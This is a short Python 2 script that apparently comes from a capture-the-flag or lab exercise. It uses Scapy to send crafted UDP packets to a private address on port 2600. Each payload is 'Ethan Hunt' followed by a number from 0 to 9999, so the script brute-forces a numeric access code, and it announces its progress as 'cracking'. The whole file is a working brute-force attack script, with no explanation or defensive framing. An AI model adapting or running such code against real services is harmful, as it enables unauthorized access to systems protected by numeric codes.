from scapy.all import *
from scapy.layers.inet import *
import time


def main():
    # Setup packet parameters
    target = "10.12.1.144"
    ports = [33333]

    # Can be used to store recieved answer packets, but the send line must be swapped with sr
    # recv = []

    print "Establishing connection ...\n"

    # Not Windows compatible, I think, but uncomment this and add in "skt.sr()" to the send lines to speed up sending.
    # skt = conf.L3socket(iface="eth0")

    print "Connection established!\n"
    print "Beginning cracking...\n"

    for p in ports:
        for i in range(10000):
            pkt = packet_craft(i, p, target)
            # Sleep added to avoid overloading the server.  Could probably be reduced somewhat
            time.sleep(.5)
            # Verbosity level is numeric.  0 is for a silent send
            send(pkt, verbose=0)
            # This swap is required to use the recv variable to store received packet responses
            # recv, _ = sr(pkt, verbose=0)
            print "Sent packet {:d} on port {:d}\n".format(i, p)

    print "Done cracking!\n"


def packet_craft(code_attempt, source_port, target):
    """Takes source port and returns a Scapy packet using that source port attacking a constant target"""
    agent_name = "Ethan Hunt "
    payload = agent_name + str(code_attempt)
    pkt = IP(dst=target) / UDP(sport=source_port, dport=2600) / payload
    return pkt


main()
